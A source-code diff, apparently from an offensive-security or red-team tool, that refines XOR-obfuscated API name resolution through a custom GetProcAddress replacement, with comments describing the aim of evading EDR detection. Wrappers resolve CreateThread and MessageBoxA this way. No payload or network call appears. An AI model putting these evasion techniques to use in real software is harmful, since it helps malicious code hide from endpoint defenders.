@@ -342,7 +342,8 @@ void XorText(char *text, char key) {
 
 FARPROC ResolveFunction(const wchar_t* module_name, const char* function_name)
 {
-    DEBUG_LOG("[+] Attempting to resolve function %s\n", function_name);
+    DEBUG_LOG("[+] Attempting to resolve function: %s\n", function_name);
+
     HMODULE hModule = GetModuleHandleW(module_name);
     if (!hModule) {
         DEBUG_LOG("[!] GetModuleHandleW failed, trying LoadLibraryW.\n");
@@ -356,14 +357,16 @@ FARPROC ResolveFunction(const wchar_t* module_name, const char* function_name)
 
     DEBUG_LOGW(L"[+] Successful handle to %ls \n", module_name);
 
-    FARPROC pFunc = GetProcAddressReplacement(hModule, function_name);//GetProcAddress(hModule, function_name);
+    // Attempt function resolution
+    FARPROC pFunc = GetProcAddressReplacement(hModule, function_name);
     if (!pFunc) {
-        DEBUG_LOG("[-] GetProcAddress failed for %s. Error=%lu.\n", function_name, GetLastError());
+        DEBUG_LOG("[-] GetProcAddressReplacement failed for %s. Error=%lu.\n", function_name, GetLastError());
         return NULL;
     }
 
     return pFunc;
 }
+
 
 FARPROC GetProcAddressReplacement(IN HMODULE hModule, IN LPCSTR lpFuncNameXor) {
     /*
@@ -432,7 +435,6 @@ FARPROC GetProcAddressReplacement(IN HMODULE hModule, IN LPCSTR lpFuncNameXor) {
 	// Getting the function's ordinal array pointer
 	PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);
 
-
 	// Looping through all the exported functions
 	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++){
 		
@@ -442,31 +444,42 @@ FARPROC GetProcAddressReplacement(IN HMODULE hModule, IN LPCSTR lpFuncNameXor) {
 		// Getting the address of the function through its ordinal
 		PVOID pFunctionAddress	= (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);
 
-
-        size_t pFunctionName_Length = strlen(pFunctionName);  // Get actual string length
-        BYTE* pFunctionNameXor = (BYTE*)malloc(pFunctionName_Length + 1);
-        if (!pFunctionNameXor) {
-            return NULL;
-        }
+        //setup func name to be XOR'd
+        size_t pFunctionName_Length = strlen(pFunctionName);
+        BYTE* pFunctionNameXor = (BYTE*)malloc(pFunctionName_Length + 1); // +1 for \0 safety
+        if (!pFunctionNameXor) return NULL;
+        memcpy(pFunctionNameXor, pFunctionName, pFunctionName_Length);
 
         // Copy original name before XOR-ing
         memcpy(pFunctionNameXor, pFunctionName, pFunctionName_Length + 1);
+
+        // DEBUG_LOG("Original function name: %s\n", pFunctionName);
+        // DEBUG_LOG("Function name XOR key: 0x%X\n", FUNC_ENCRYPTED_NAME_KEY);
 
         //XOR pFuncName, to use for comparison below
         for (size_t j = 0; j < pFunctionName_Length; j++) {
             pFunctionNameXor[j] ^= FUNC_ENCRYPTED_NAME_KEY;
         }
 
+        // DEBUG_LOG("XOR'd function name: %s\n", pFunctionNameXor);
+
         //compare lpFuncName, and pFunctionNameXor, which are now both XOR'd.
         if (memcmp(lpFuncNameXor, pFunctionNameXor, pFunctionName_Length) == 0) {
 			DEBUG_LOG("[ %0.4d ] FOUND API -\t NAME: %s -\t ADDRESS: 0x%p  -\t ORDINAL: %d\n", i, pFunctionName, pFunctionAddress, FunctionOrdinalArray[i]);
 	        //call a secure free (instead of regular free) to 0 out the memory where the XOR func name was stored, just in case
             //an EDR gets smart and tries to brute force the XOR value
-            SecureFree(pFunctionNameXor, strlen(pFunctionNameXor));
+            //SecureFree(pFunctionNameXor, strlen(pFunctionNameXor));
+            //SecureFree(pFunctionNameXor, pFunctionName_Length);
 
             return pFunctionAddress;
 		}
+        
+        //free no matter what
+        //maybe move to secure free? Prolly not a big deal, it's still XOR'd
+        free(pFunctionNameXor);
+
 	}
+
 	return NULL;
 }
 
@@ -519,7 +532,7 @@ HANDLE WhisperCreateThread(
     DEBUG_LOG("[FUNC_CALL] WhisperCreateThread\n");
 
     if (!pCreateThread) {
-        pCreateThread = (CreateThread_t)ResolveFunction(L"kernel32.dll", FUNC_WhisperCreateThread_ENCRYPTED_NAME);
+        pCreateThread = (CreateThread_t)ResolveFunction(L"kernel32.dll", FUNC_CreateThread_ENCRYPTED_NAME);
         if (!pCreateThread)
             return NULL;
     }
@@ -814,7 +827,7 @@ int WhisperMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)
     DEBUG_LOG("[FUNC_CALL] WhisperMessageBoxA\n");
 
     if (!pMessageBoxA) {
-            pMessageBoxA = (MessageBoxA_t)ResolveFunction(L"user32.dll", FUNC_WhisperMessageBoxA_ENCRYPTED_NAME);
+            pMessageBoxA = (MessageBoxA_t)ResolveFunction(L"user32.dll", FUNC_MessageBoxA_ENCRYPTED_NAME);
             if (!pMessageBoxA) {
                 return FALSE;
             }
